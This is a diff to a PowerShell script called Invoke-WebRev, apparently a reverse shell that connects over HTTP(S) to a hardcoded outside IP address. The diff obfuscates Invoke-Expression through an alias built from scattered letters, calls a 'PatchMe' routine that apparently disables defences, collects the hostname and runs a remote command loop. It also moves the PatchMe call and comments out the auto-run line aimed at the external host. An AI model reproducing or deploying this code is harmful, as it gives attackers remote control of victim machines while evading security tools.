@@ -30,11 +30,10 @@ function Invoke-WebRev{
 "@
 
     if(-not $ip -or -not $port) { return $help; }
-    
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     
     [array]$shurmano = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
-    
+    PatchMe; 
 
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
@@ -50,7 +49,7 @@ function Invoke-WebRev{
 
     try { $error[0] = ""; } catch {}
 
-    PatchMe;
+    #PatchMe;
     $previous_functions = (ls function:).Name;
     [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );
     while ($true)
@@ -238,4 +237,4 @@ function PatchMe
     taleska-ei-vrixeka $data;
 }
 
-Invoke-WebRev -ip 34.254.88.76 -port 443 -ssl;
+#Invoke-WebRev -ip 34.254.88.76 -port 443 -ssl;
